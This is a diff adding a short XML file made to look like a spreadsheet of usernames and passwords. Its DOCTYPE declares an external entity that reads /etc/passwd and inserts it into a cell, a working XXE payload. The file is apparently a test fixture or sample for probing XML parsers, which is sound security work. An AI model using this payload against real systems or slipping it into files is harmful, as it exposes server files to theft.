@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE spreadsheet [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<spreadsheet>
+  <row id="1">
+    <cell column="A">Username</cell>
+    <cell column="B">Password</cell>
+  </row>
+  <row id="2">
+    <cell column="A">admin</cell>
+    <cell column="B">&xxe;</cell>
+  </row>
+</spreadsheet>
